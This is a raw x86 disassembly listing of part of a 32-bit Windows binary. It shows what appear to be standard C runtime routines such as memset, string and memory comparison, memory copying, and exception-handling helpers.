  427c4a:	je     0x427c9b
  427c4c:	xor    eax,eax
  427c4e:	mov    al,BYTE PTR [esp+0x8]
  427c52:	push   edi
  427c53:	mov    edi,ecx
  427c55:	cmp    edx,0x4
  427c58:	jb     0x427c8b
  427c5a:	neg    ecx
  427c5c:	and    ecx,0x3
  427c5f:	je     0x427c6d
  427c61:	sub    edx,ecx
  427c63:	mov    BYTE PTR [edi],al
  427c65:	add    edi,0x1
  427c68:	sub    ecx,0x1
  427c6b:	jne    0x427c63
  427c6d:	mov    ecx,eax
  427c6f:	shl    eax,0x8
  427c72:	add    eax,ecx
  427c74:	mov    ecx,eax
  427c76:	shl    eax,0x10
  427c79:	add    eax,ecx
  427c7b:	mov    ecx,edx
  427c7d:	and    edx,0x3
  427c80:	shr    ecx,0x2
  427c83:	je     0x427c8b
  427c85:	rep stos DWORD PTR es:[edi],eax
  427c87:	test   edx,edx
  427c89:	je     0x427c95
  427c8b:	mov    BYTE PTR [edi],al
  427c8d:	add    edi,0x1
  427c90:	sub    edx,0x1
  427c93:	jne    0x427c8b
  427c95:	mov    eax,DWORD PTR [esp+0x8]
  427c99:	pop    edi
  427c9a:	ret    
  427c9b:	mov    eax,DWORD PTR [esp+0x4]
  427c9f:	ret    
  427ca0:	push   esi
  427ca1:	mov    esi,DWORD PTR [esp+0x8]
  427ca5:	test   esi,esi
  427ca7:	je     0x427e2e
  427cad:	push   DWORD PTR [esi+0x4]
  427cb0:	call   0x425f4a
  427cb5:	push   DWORD PTR [esi+0x8]
  427cb8:	call   0x425f4a
  427cbd:	push   DWORD PTR [esi+0xc]
  427cc0:	call   0x425f4a
  427cc5:	push   DWORD PTR [esi+0x10]
  427cc8:	call   0x425f4a
  427ccd:	push   DWORD PTR [esi+0x14]
  427cd0:	call   0x425f4a
  427cd5:	push   DWORD PTR [esi+0x18]
  427cd8:	call   0x425f4a
  427cdd:	push   DWORD PTR [esi]
  427cdf:	call   0x425f4a
  427ce4:	push   DWORD PTR [esi+0x20]
  427ce7:	call   0x425f4a
  427cec:	push   DWORD PTR [esi+0x24]
  427cef:	call   0x425f4a
  427cf4:	push   DWORD PTR [esi+0x28]
  427cf7:	call   0x425f4a
  427cfc:	push   DWORD PTR [esi+0x2c]
  427cff:	call   0x425f4a
  427d04:	push   DWORD PTR [esi+0x30]
  427d07:	call   0x425f4a
  427d0c:	push   DWORD PTR [esi+0x34]
  427d0f:	call   0x425f4a
  427d14:	push   DWORD PTR [esi+0x1c]
  427d17:	call   0x425f4a
  427d1c:	push   DWORD PTR [esi+0x38]
  427d1f:	call   0x425f4a
  427d24:	push   DWORD PTR [esi+0x3c]
  427d27:	call   0x425f4a
  427d2c:	add    esp,0x40
  427d2f:	push   DWORD PTR [esi+0x40]
  427d32:	call   0x425f4a
  427d37:	push   DWORD PTR [esi+0x44]
  427d3a:	call   0x425f4a
  427d3f:	push   DWORD PTR [esi+0x48]
  427d42:	call   0x425f4a
  427d47:	push   DWORD PTR [esi+0x4c]
  427d4a:	call   0x425f4a
  427d4f:	push   DWORD PTR [esi+0x50]
  427d52:	call   0x425f4a
  427d57:	push   DWORD PTR [esi+0x54]
  427d5a:	call   0x425f4a
  427d5f:	push   DWORD PTR [esi+0x58]
  427d62:	call   0x425f4a
  427d67:	push   DWORD PTR [esi+0x5c]
  427d6a:	call   0x425f4a
  427d6f:	push   DWORD PTR [esi+0x60]
  427d72:	call   0x425f4a
  427d77:	push   DWORD PTR [esi+0x64]
  427d7a:	call   0x425f4a
  427d7f:	push   DWORD PTR [esi+0x68]
  427d82:	call   0x425f4a
  427d87:	push   DWORD PTR [esi+0x6c]
  427d8a:	call   0x425f4a
  427d8f:	push   DWORD PTR [esi+0x70]
  427d92:	call   0x425f4a
  427d97:	push   DWORD PTR [esi+0x74]
  427d9a:	call   0x425f4a
  427d9f:	push   DWORD PTR [esi+0x78]
  427da2:	call   0x425f4a
  427da7:	push   DWORD PTR [esi+0x7c]
  427daa:	call   0x425f4a
  427daf:	add    esp,0x40
  427db2:	push   DWORD PTR [esi+0x80]
  427db8:	call   0x425f4a
  427dbd:	push   DWORD PTR [esi+0x84]
  427dc3:	call   0x425f4a
  427dc8:	push   DWORD PTR [esi+0x88]
  427dce:	call   0x425f4a
  427dd3:	push   DWORD PTR [esi+0x8c]
  427dd9:	call   0x425f4a
  427dde:	push   DWORD PTR [esi+0x90]
  427de4:	call   0x425f4a
  427de9:	push   DWORD PTR [esi+0x94]
  427def:	call   0x425f4a
  427df4:	push   DWORD PTR [esi+0x98]
  427dfa:	call   0x425f4a
  427dff:	push   DWORD PTR [esi+0x9c]
  427e05:	call   0x425f4a
  427e0a:	push   DWORD PTR [esi+0xa0]
  427e10:	call   0x425f4a
  427e15:	push   DWORD PTR [esi+0xa4]
  427e1b:	call   0x425f4a
  427e20:	push   DWORD PTR [esi+0xa8]
  427e26:	call   0x425f4a
  427e2b:	add    esp,0x2c
  427e2e:	pop    esi
  427e2f:	ret    
  427e30:	push   esi
  427e31:	mov    esi,DWORD PTR [esp+0x8]
  427e35:	test   esi,esi
  427e37:	je     0x427e8d
  427e39:	mov    eax,DWORD PTR [esi]
  427e3b:	mov    ecx,DWORD PTR ds:0x45d934
  427e41:	cmp    eax,DWORD PTR [ecx]
  427e43:	je     0x427e54
  427e45:	cmp    eax,DWORD PTR ds:0x45d904
  427e4b:	je     0x427e54
  427e4d:	push   eax
  427e4e:	call   0x425f4a
  427e53:	pop    ecx
  427e54:	mov    eax,DWORD PTR [esi+0x4]
  427e57:	mov    ecx,DWORD PTR ds:0x45d934
  427e5d:	cmp    eax,DWORD PTR [ecx+0x4]
  427e60:	je     0x427e71
  427e62:	cmp    eax,DWORD PTR ds:0x45d908
  427e68:	je     0x427e71
  427e6a:	push   eax
  427e6b:	call   0x425f4a
  427e70:	pop    ecx
  427e71:	mov    esi,DWORD PTR [esi+0x8]
  427e74:	mov    eax,ds:0x45d934
  427e79:	cmp    esi,DWORD PTR [eax+0x8]
  427e7c:	je     0x427e8d
  427e7e:	cmp    esi,DWORD PTR ds:0x45d90c
  427e84:	je     0x427e8d
  427e86:	push   esi
  427e87:	call   0x425f4a
  427e8c:	pop    ecx
  427e8d:	pop    esi
  427e8e:	ret    
  427e8f:	push   esi
  427e90:	mov    esi,DWORD PTR [esp+0x8]
  427e94:	test   esi,esi
  427e96:	je     0x427f66
  427e9c:	mov    eax,DWORD PTR [esi+0xc]
  427e9f:	mov    ecx,DWORD PTR ds:0x45d934
  427ea5:	cmp    eax,DWORD PTR [ecx+0xc]
  427ea8:	je     0x427eb9
  427eaa:	cmp    eax,DWORD PTR ds:0x45d910
  427eb0:	je     0x427eb9
  427eb2:	push   eax
  427eb3:	call   0x425f4a
  427eb8:	pop    ecx
  427eb9:	mov    eax,DWORD PTR [esi+0x10]
  427ebc:	mov    ecx,DWORD PTR ds:0x45d934
  427ec2:	cmp    eax,DWORD PTR [ecx+0x10]
  427ec5:	je     0x427ed6
  427ec7:	cmp    eax,DWORD PTR ds:0x45d914
  427ecd:	je     0x427ed6
  427ecf:	push   eax
  427ed0:	call   0x425f4a
  427ed5:	pop    ecx
  427ed6:	mov    eax,DWORD PTR [esi+0x14]
  427ed9:	mov    ecx,DWORD PTR ds:0x45d934
  427edf:	cmp    eax,DWORD PTR [ecx+0x14]
  427ee2:	je     0x427ef3
  427ee4:	cmp    eax,DWORD PTR ds:0x45d918
  427eea:	je     0x427ef3
  427eec:	push   eax
  427eed:	call   0x425f4a
  427ef2:	pop    ecx
  427ef3:	mov    eax,DWORD PTR [esi+0x18]
  427ef6:	mov    ecx,DWORD PTR ds:0x45d934
  427efc:	cmp    eax,DWORD PTR [ecx+0x18]
  427eff:	je     0x427f10
  427f01:	cmp    eax,DWORD PTR ds:0x45d91c
  427f07:	je     0x427f10
  427f09:	push   eax
  427f0a:	call   0x425f4a
  427f0f:	pop    ecx
  427f10:	mov    eax,DWORD PTR [esi+0x1c]
  427f13:	mov    ecx,DWORD PTR ds:0x45d934
  427f19:	cmp    eax,DWORD PTR [ecx+0x1c]
  427f1c:	je     0x427f2d
  427f1e:	cmp    eax,DWORD PTR ds:0x45d920
  427f24:	je     0x427f2d
  427f26:	push   eax
  427f27:	call   0x425f4a
  427f2c:	pop    ecx
  427f2d:	mov    eax,DWORD PTR [esi+0x20]
  427f30:	mov    ecx,DWORD PTR ds:0x45d934
  427f36:	cmp    eax,DWORD PTR [ecx+0x20]
  427f39:	je     0x427f4a
  427f3b:	cmp    eax,DWORD PTR ds:0x45d924
  427f41:	je     0x427f4a
  427f43:	push   eax
  427f44:	call   0x425f4a
  427f49:	pop    ecx
  427f4a:	mov    esi,DWORD PTR [esi+0x24]
  427f4d:	mov    eax,ds:0x45d934
  427f52:	cmp    esi,DWORD PTR [eax+0x24]
  427f55:	je     0x427f66
  427f57:	cmp    esi,DWORD PTR ds:0x45d928
  427f5d:	je     0x427f66
  427f5f:	push   esi
  427f60:	call   0x425f4a
  427f65:	pop    ecx
  427f66:	pop    esi
  427f67:	ret    
  427f68:	int3   
  427f69:	int3   
  427f6a:	int3   
  427f6b:	int3   
  427f6c:	int3   
  427f6d:	int3   
  427f6e:	int3   
  427f6f:	int3   
  427f70:	push   ebp
  427f71:	mov    ebp,esp
  427f73:	push   esi
  427f74:	xor    eax,eax
  427f76:	push   eax
  427f77:	push   eax
  427f78:	push   eax
  427f79:	push   eax
  427f7a:	push   eax
  427f7b:	push   eax
  427f7c:	push   eax
  427f7d:	push   eax
  427f7e:	mov    edx,DWORD PTR [ebp+0xc]
  427f81:	lea    ecx,[ecx+0x0]
  427f84:	mov    al,BYTE PTR [edx]
  427f86:	or     al,al
  427f88:	je     0x427f93
  427f8a:	add    edx,0x1
  427f8d:	bts    DWORD PTR [esp],eax
  427f91:	jmp    0x427f84
  427f93:	mov    esi,DWORD PTR [ebp+0x8]
  427f96:	or     ecx,0xffffffff
  427f99:	lea    ecx,[ecx+0x0]
  427f9c:	add    ecx,0x1
  427f9f:	mov    al,BYTE PTR [esi]
  427fa1:	or     al,al
  427fa3:	je     0x427fae
  427fa5:	add    esi,0x1
  427fa8:	bt     DWORD PTR [esp],eax
  427fac:	jae    0x427f9c
  427fae:	mov    eax,ecx
  427fb0:	add    esp,0x20
  427fb3:	pop    esi
  427fb4:	leave  
  427fb5:	ret    
  427fb6:	int3   
  427fb7:	int3   
  427fb8:	int3   
  427fb9:	int3   
  427fba:	int3   
  427fbb:	int3   
  427fbc:	int3   
  427fbd:	int3   
  427fbe:	int3   
  427fbf:	int3   
  427fc0:	mov    edx,DWORD PTR [esp+0x4]
  427fc4:	mov    ecx,DWORD PTR [esp+0x8]
  427fc8:	test   edx,0x3
  427fce:	jne    0x42800c
  427fd0:	mov    eax,DWORD PTR [edx]
  427fd2:	cmp    al,BYTE PTR [ecx]
  427fd4:	jne    0x428004
  427fd6:	or     al,al
  427fd8:	je     0x428000
  427fda:	cmp    ah,BYTE PTR [ecx+0x1]
  427fdd:	jne    0x428004
  427fdf:	or     ah,ah
  427fe1:	je     0x428000
  427fe3:	shr    eax,0x10
  427fe6:	cmp    al,BYTE PTR [ecx+0x2]
  427fe9:	jne    0x428004
  427feb:	or     al,al
  427fed:	je     0x428000
  427fef:	cmp    ah,BYTE PTR [ecx+0x3]
  427ff2:	jne    0x428004
  427ff4:	add    ecx,0x4
  427ff7:	add    edx,0x4
  427ffa:	or     ah,ah
  427ffc:	jne    0x427fd0
  427ffe:	mov    edi,edi
  428000:	xor    eax,eax
  428002:	ret    
  428003:	nop
  428004:	sbb    eax,eax
  428006:	shl    eax,1
  428008:	add    eax,0x1
  42800b:	ret    
  42800c:	test   edx,0x1
  428012:	je     0x42802c
  428014:	mov    al,BYTE PTR [edx]
  428016:	add    edx,0x1
  428019:	cmp    al,BYTE PTR [ecx]
  42801b:	jne    0x428004
  42801d:	add    ecx,0x1
  428020:	or     al,al
  428022:	je     0x428000
  428024:	test   edx,0x2
  42802a:	je     0x427fd0
  42802c:	mov    ax,WORD PTR [edx]
  42802f:	add    edx,0x2
  428032:	cmp    al,BYTE PTR [ecx]
  428034:	jne    0x428004
  428036:	or     al,al
  428038:	je     0x428000
  42803a:	cmp    ah,BYTE PTR [ecx+0x1]
  42803d:	jne    0x428004
  42803f:	or     ah,ah
  428041:	je     0x428000
  428043:	add    ecx,0x2
  428046:	jmp    0x427fd0
  428048:	int3   
  428049:	int3   
  42804a:	int3   
  42804b:	int3   
  42804c:	int3   
  42804d:	int3   
  42804e:	int3   
  42804f:	int3   
  428050:	mov    eax,DWORD PTR [esp+0xc]
  428054:	test   eax,eax
  428056:	je     0x4280a2
  428058:	mov    edx,DWORD PTR [esp+0x4]
  42805c:	push   esi
  42805d:	push   edi
  42805e:	mov    esi,edx
  428060:	mov    edi,DWORD PTR [esp+0x10]
  428064:	or     edx,edi
  428066:	and    edx,0x3
  428069:	je     0x4280a3
  42806b:	test   eax,0x1
  428070:	je     0x428083
  428072:	mov    cl,BYTE PTR [esi]
  428074:	cmp    cl,BYTE PTR [edi]
  428076:	jne    0x4280d0
  428078:	add    esi,0x1
  42807b:	add    edi,0x1
  42807e:	sub    eax,0x1
  428081:	je     0x4280a0
  428083:	mov    cl,BYTE PTR [esi]
  428085:	mov    dl,BYTE PTR [edi]
  428087:	cmp    cl,dl
  428089:	jne    0x4280d0
  42808b:	mov    cl,BYTE PTR [esi+0x1]
  42808e:	mov    dl,BYTE PTR [edi+0x1]
  428091:	cmp    cl,dl
  428093:	jne    0x4280d0
  428095:	add    edi,0x2
  428098:	add    esi,0x2
  42809b:	sub    eax,0x2
  42809e:	jne    0x428083
  4280a0:	pop    edi
  4280a1:	pop    esi
  4280a2:	ret    
  4280a3:	mov    ecx,eax
  4280a5:	and    eax,0x3
  4280a8:	shr    ecx,0x2
  4280ab:	je     0x4280d8
  4280ad:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280af:	je     0x4280d8
  4280b1:	mov    ecx,DWORD PTR [esi-0x4]
  4280b4:	mov    edx,DWORD PTR [edi-0x4]
  4280b7:	cmp    cl,dl
  4280b9:	jne    0x4280cb
  4280bb:	cmp    ch,dh
  4280bd:	jne    0x4280cb
  4280bf:	shr    ecx,0x10
  4280c2:	shr    edx,0x10
  4280c5:	cmp    cl,dl
  4280c7:	jne    0x4280cb
  4280c9:	cmp    ch,dh
  4280cb:	mov    eax,0x0
  4280d0:	sbb    eax,eax
  4280d2:	pop    edi
  4280d3:	sbb    eax,0xffffffff
  4280d6:	pop    esi
  4280d7:	ret    
  4280d8:	test   eax,eax
  4280da:	je     0x4280a0
  4280dc:	mov    edx,DWORD PTR [esi]
  4280de:	mov    ecx,DWORD PTR [edi]
  4280e0:	cmp    dl,cl
  4280e2:	jne    0x4280cb
  4280e4:	sub    eax,0x1
  4280e7:	je     0x428105
  4280e9:	cmp    dh,ch
  4280eb:	jne    0x4280cb
  4280ed:	sub    eax,0x1
  4280f0:	je     0x428105
  4280f2:	and    ecx,0xff0000
  4280f8:	and    edx,0xff0000
  4280fe:	cmp    edx,ecx
  428100:	jne    0x4280cb
  428102:	sub    eax,0x1
  428105:	pop    edi
  428106:	pop    esi
  428107:	ret    
  428108:	int3   
  428109:	int3   
  42810a:	int3   
  42810b:	int3   
  42810c:	int3   
  42810d:	int3   
  42810e:	int3   
  42810f:	int3   
  428110:	push   ebp
  428111:	mov    ebp,esp
  428113:	push   edi
  428114:	push   esi
  428115:	push   ebx
  428116:	mov    ecx,DWORD PTR [ebp+0x10]
  428119:	jecxz  0x428142
  42811b:	mov    ebx,ecx
  42811d:	mov    edi,DWORD PTR [ebp+0x8]
  428120:	mov    esi,edi
  428122:	xor    eax,eax
  428124:	repnz scas al,BYTE PTR es:[edi]
  428126:	neg    ecx
  428128:	add    ecx,ebx
  42812a:	mov    edi,esi
  42812c:	mov    esi,DWORD PTR [ebp+0xc]
  42812f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428131:	mov    al,BYTE PTR [esi-0x1]
  428134:	xor    ecx,ecx
  428136:	cmp    al,BYTE PTR [edi-0x1]
  428139:	ja     0x428140
  42813b:	je     0x428142
  42813d:	sub    ecx,0x2
  428140:	not    ecx
  428142:	mov    eax,ecx
  428144:	pop    ebx
  428145:	pop    esi
  428146:	pop    edi
  428147:	leave  
  428148:	ret    
  428149:	int3   
  42814a:	int3   
  42814b:	int3   
  42814c:	int3   
  42814d:	int3   
  42814e:	int3   
  42814f:	int3   
  428150:	push   ebp
  428151:	mov    ebp,esp
  428153:	push   esi
  428154:	xor    eax,eax
  428156:	push   eax
  428157:	push   eax
  428158:	push   eax
  428159:	push   eax
  42815a:	push   eax
  42815b:	push   eax
  42815c:	push   eax
  42815d:	push   eax
  42815e:	mov    edx,DWORD PTR [ebp+0xc]
  428161:	lea    ecx,[ecx+0x0]
  428164:	mov    al,BYTE PTR [edx]
  428166:	or     al,al
  428168:	je     0x428173
  42816a:	add    edx,0x1
  42816d:	bts    DWORD PTR [esp],eax
  428171:	jmp    0x428164
  428173:	mov    esi,DWORD PTR [ebp+0x8]
  428176:	mov    edi,edi
  428178:	mov    al,BYTE PTR [esi]
  42817a:	or     al,al
  42817c:	je     0x42818a
  42817e:	add    esi,0x1
  428181:	bt     DWORD PTR [esp],eax
  428185:	jae    0x428178
  428187:	lea    eax,[esi-0x1]
  42818a:	add    esp,0x20
  42818d:	pop    esi
  42818e:	leave  
  42818f:	ret    
  428190:	push   ebp
  428191:	mov    ebp,esp
  428193:	push   ebx
  428194:	push   esi
  428195:	push   edi
  428196:	push   ebp
  428197:	push   0x0
  428199:	push   0x0
  42819b:	push   0x4281a8
  4281a0:	push   DWORD PTR [ebp+0x8]
  4281a3:	call   0x428c1e
  4281a8:	pop    ebp
  4281a9:	pop    edi
  4281aa:	pop    esi
  4281ab:	pop    ebx
  4281ac:	mov    esp,ebp
  4281ae:	pop    ebp
  4281af:	ret    
  4281b0:	mov    ecx,DWORD PTR [esp+0x4]
  4281b4:	test   DWORD PTR [ecx+0x4],0x6
  4281bb:	mov    eax,0x1
  4281c0:	je     0x4281d1
  4281c2:	mov    eax,DWORD PTR [esp+0x8]
  4281c6:	mov    edx,DWORD PTR [esp+0x10]
  4281ca:	mov    DWORD PTR [edx],eax
  4281cc:	mov    eax,0x3
  4281d1:	ret    
  4281d2:	push   ebx
  4281d3:	push   esi
  4281d4:	push   edi
  4281d5:	mov    eax,DWORD PTR [esp+0x10]
  4281d9:	push   eax
  4281da:	push   0xfffffffe
  4281dc:	push   0x4281b0
  4281e1:	push   DWORD PTR fs:0x0
  4281e8:	mov    DWORD PTR fs:0x0,esp
  4281ef:	mov    eax,DWORD PTR [esp+0x20]
  4281f3:	mov    ebx,DWORD PTR [eax+0x8]
  4281f6:	mov    esi,DWORD PTR [eax+0xc]
  4281f9:	cmp    esi,0xffffffff
  4281fc:	je     0x42822c
  4281fe:	cmp    esi,DWORD PTR [esp+0x24]
  428202:	je     0x42822c
  428204:	lea    esi,[esi+esi*2]
  428207:	mov    ecx,DWORD PTR [ebx+esi*4]
  42820a:	mov    DWORD PTR [esp+0x8],ecx
  42820e:	mov    DWORD PTR [eax+0xc],ecx
  428211:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428216:	jne    0x42822a
  428218:	push   0x101
  42821d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428221:	call   0x428266
  428226:	call   DWORD PTR [ebx+esi*4+0x8]
  42822a:	jmp    0x4281ef
  42822c:	pop    DWORD PTR fs:0x0
  428233:	add    esp,0xc
  428236:	pop    edi
  428237:	pop    esi
  428238:	pop    ebx
  428239:	ret    
  42823a:	xor    eax,eax
  42823c:	mov    ecx,DWORD PTR fs:0x0
  428243:	cmp    DWORD PTR [ecx+0x4],0x4281b0
  42824a:	jne    0x42825c
  42824c:	mov    edx,DWORD PTR [ecx+0xc]
  42824f:	mov    edx,DWORD PTR [edx+0xc]
  428252:	cmp    DWORD PTR [ecx+0x8],edx
  428255:	jne    0x42825c
  428257:	mov    eax,0x1
  42825c:	ret    
  42825d:	push   ebx
  42825e:	push   ecx
  42825f:	mov    ebx,0x45d94c
  428264:	jmp    0x428270
  428266:	push   ebx
  428267:	push   ecx
  428268:	mov    ebx,0x45d94c
  42826d:	mov    ecx,DWORD PTR [ebp+0x8]
  428270:	mov    DWORD PTR [ebx+0x8],ecx
  428273:	mov    DWORD PTR [ebx+0x4],eax
  428276:	mov    DWORD PTR [ebx+0xc],ebp
  428279:	pop    ecx
  42827a:	pop    ebx
  42827b:	ret    0x4
  42827e:	int3   
  42827f:	int3   
  428280:	push   ebp
  428281:	mov    ebp,esp
  428283:	push   edi
  428284:	push   esi
  428285:	mov    esi,DWORD PTR [ebp+0xc]
  428288:	mov    ecx,DWORD PTR [ebp+0x10]
  42828b:	mov    edi,DWORD PTR [ebp+0x8]
  42828e:	mov    eax,ecx
  428290:	mov    edx,ecx
  428292:	add    eax,esi
  428294:	cmp    edi,esi
  428296:	jbe    0x4282a0
  428298:	cmp    edi,eax
  42829a:	jb     0x42841c
  4282a0:	test   edi,0x3
  4282a6:	jne    0x4282bc
  4282a8:	shr    ecx,0x2
  4282ab:	and    edx,0x3
  4282ae:	cmp    ecx,0x8
  4282b1:	jb     0x4282dc
  4282b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282b5:	jmp    DWORD PTR [edx*4+0x4283cc]
  4282bc:	mov    eax,edi
  4282be:	mov    edx,0x3
  4282c3:	sub    ecx,0x4
  4282c6:	jb     0x4282d4
  4282c8:	and    eax,0x3
  4282cb:	add    ecx,eax
  4282cd:	jmp    DWORD PTR [eax*4+0x4282e0]
  4282d4:	jmp    DWORD PTR [ecx*4+0x4283dc]
  4282db:	nop
  4282dc:	jmp    DWORD PTR [ecx*4+0x428360]
  4282e3:	nop
  4282e4:	lock add BYTE PTR [edx+0x0],0x1c
  4282e9:	add    DWORD PTR [edx+0x0],0x40
  4282ed:	add    DWORD PTR [edx+0x0],0x23
  4282f1:	ror    DWORD PTR [edx-0x75f877fa],1
  4282f7:	inc    esi
  4282f8:	add    DWORD PTR [eax+0x468a0147],ecx
  4282fe:	add    al,cl
  428300:	jmp    0x28a0b07
  428305:	add    esi,0x3
  428308:	add    edi,0x3
  42830b:	cmp    ecx,0x8
  42830e:	jb     0x4282dc
  428310:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428312:	jmp    DWORD PTR [edx*4+0x4283cc]
  428319:	lea    ecx,[ecx+0x0]
  42831c:	and    edx,ecx
  42831e:	mov    al,BYTE PTR [esi]
  428320:	mov    BYTE PTR [edi],al
  428322:	mov    al,BYTE PTR [esi+0x1]
  428325:	shr    ecx,0x2
  428328:	mov    BYTE PTR [edi+0x1],al
  42832b:	add    esi,0x2
  42832e:	add    edi,0x2
  428331:	cmp    ecx,0x8
  428334:	jb     0x4282dc
  428336:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428338:	jmp    DWORD PTR [edx*4+0x4283cc]
  42833f:	nop
  428340:	and    edx,ecx
  428342:	mov    al,BYTE PTR [esi]
  428344:	mov    BYTE PTR [edi],al
  428346:	add    esi,0x1
  428349:	shr    ecx,0x2
  42834c:	add    edi,0x1
  42834f:	cmp    ecx,0x8
  428352:	jb     0x4282dc
  428354:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428356:	jmp    DWORD PTR [edx*4+0x4283cc]
  42835d:	lea    ecx,[ecx+0x0]
  428360:	ret    
  428361:	add    DWORD PTR [edx+0x0],0xffffffb0
  428365:	add    DWORD PTR [edx+0x0],0xffffffa8
  428369:	add    DWORD PTR [edx+0x0],0xffffffa0
  42836d:	add    DWORD PTR [edx+0x0],0xffffff98
  428371:	add    DWORD PTR [edx+0x0],0xffffff90
  428375:	add    DWORD PTR [edx+0x0],0xffffff88
  428379:	add    DWORD PTR [edx+0x0],0xffffff80
  42837d:	add    DWORD PTR [edx+0x0],0xffffff8b
  428381:	inc    esp
  428382:	mov    fs,esp
  428384:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  428388:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42838c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  428390:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  428394:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  428398:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42839c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4283a0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4283a4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4283a8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4283ac:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4283b0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4283b4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4283b8:	lea    eax,[ecx*4+0x0]
  4283bf:	add    esi,eax
  4283c1:	add    edi,eax
  4283c3:	jmp    DWORD PTR [edx*4+0x4283cc]
  4283ca:	mov    edi,edi
  4283cc:	fadd   QWORD PTR [ebx-0x7c1bffbe]
  4283d2:	inc    edx
  4283d3:	add    al,dh
  4283d5:	add    DWORD PTR [edx+0x0],0x4
  4283d9:	test   BYTE PTR [edx+0x0],al
  4283dc:	mov    eax,DWORD PTR [ebp+0x8]
  4283df:	pop    esi
  4283e0:	pop    edi
  4283e1:	leave  
  4283e2:	ret    
  4283e3:	nop
  4283e4:	mov    al,BYTE PTR [esi]
  4283e6:	mov    BYTE PTR [edi],al
  4283e8:	mov    eax,DWORD PTR [ebp+0x8]
  4283eb:	pop    esi
  4283ec:	pop    edi
  4283ed:	leave  
  4283ee:	ret    
  4283ef:	nop
  4283f0:	mov    al,BYTE PTR [esi]
  4283f2:	mov    BYTE PTR [edi],al
  4283f4:	mov    al,BYTE PTR [esi+0x1]
  4283f7:	mov    BYTE PTR [edi+0x1],al
  4283fa:	mov    eax,DWORD PTR [ebp+0x8]
  4283fd:	pop    esi
  4283fe:	pop    edi
  4283ff:	leave  
  428400:	ret    
  428401:	lea    ecx,[ecx+0x0]
  428404:	mov    al,BYTE PTR [esi]
  428406:	mov    BYTE PTR [edi],al
  428408:	mov    al,BYTE PTR [esi+0x1]
  42840b:	mov    BYTE PTR [edi+0x1],al
  42840e:	mov    al,BYTE PTR [esi+0x2]
  428411:	mov    BYTE PTR [edi+0x2],al
  428414:	mov    eax,DWORD PTR [ebp+0x8]
  428417:	pop    esi
  428418:	pop    edi
  428419:	leave  
  42841a:	ret    
  42841b:	nop
  42841c:	lea    esi,[ecx+esi*1-0x4]
  428420:	lea    edi,[ecx+edi*1-0x4]
  428424:	test   edi,0x3
  42842a:	jne    0x428450
  42842c:	shr    ecx,0x2
  42842f:	and    edx,0x3
  428432:	cmp    ecx,0x8
  428435:	jb     0x428444
  428437:	std    
  428438:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42843a:	cld    
  42843b:	jmp    DWORD PTR [edx*4+0x428568]
  428442:	mov    edi,edi
  428444:	neg    ecx
  428446:	jmp    DWORD PTR [ecx*4+0x428518]
  42844d:	lea    ecx,[ecx+0x0]
  428450:	mov    eax,edi
  428452:	mov    edx,0x3
  428457:	cmp    ecx,0x4
  42845a:	jb     0x428468
  42845c:	and    eax,0x3
  42845f:	sub    ecx,eax
  428461:	jmp    DWORD PTR [eax*4+0x42846c]
  428468:	jmp    DWORD PTR [ecx*4+0x428568]
  42846f:	nop
  428470:	jl     0x4283f6
  428472:	inc    edx
  428473:	add    BYTE PTR [eax-0x37ffbd7c],ah
  428479:	test   BYTE PTR [edx+0x0],al
  42847c:	mov    al,BYTE PTR [esi+0x3]
  42847f:	and    edx,ecx
  428481:	mov    BYTE PTR [edi+0x3],al
  428484:	sub    esi,0x1
  428487:	shr    ecx,0x2
  42848a:	sub    edi,0x1
  42848d:	cmp    ecx,0x8
  428490:	jb     0x428444
  428492:	std    
  428493:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428495:	cld    
  428496:	jmp    DWORD PTR [edx*4+0x428568]
  42849d:	lea    ecx,[ecx+0x0]
  4284a0:	mov    al,BYTE PTR [esi+0x3]
  4284a3:	and    edx,ecx
  4284a5:	mov    BYTE PTR [edi+0x3],al
  4284a8:	mov    al,BYTE PTR [esi+0x2]
  4284ab:	shr    ecx,0x2
  4284ae:	mov    BYTE PTR [edi+0x2],al
  4284b1:	sub    esi,0x2
  4284b4:	sub    edi,0x2
  4284b7:	cmp    ecx,0x8
  4284ba:	jb     0x428444
  4284bc:	std    
  4284bd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284bf:	cld    
  4284c0:	jmp    DWORD PTR [edx*4+0x428568]
  4284c7:	nop
  4284c8:	mov    al,BYTE PTR [esi+0x3]
  4284cb:	and    edx,ecx
  4284cd:	mov    BYTE PTR [edi+0x3],al
  4284d0:	mov    al,BYTE PTR [esi+0x2]
  4284d3:	mov    BYTE PTR [edi+0x2],al
  4284d6:	mov    al,BYTE PTR [esi+0x1]
  4284d9:	shr    ecx,0x2
  4284dc:	mov    BYTE PTR [edi+0x1],al
  4284df:	sub    esi,0x3
  4284e2:	sub    edi,0x3
  4284e5:	cmp    ecx,0x8
  4284e8:	jb     0x428444
  4284ee:	std    
  4284ef:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284f1:	cld    
  4284f2:	jmp    DWORD PTR [edx*4+0x428568]
  4284f9:	lea    ecx,[ecx+0x0]
  4284fc:	sbb    al,0x85
  4284fe:	inc    edx
  4284ff:	add    BYTE PTR [eax*4-0x7ad3ffbe],ah
  428506:	inc    edx
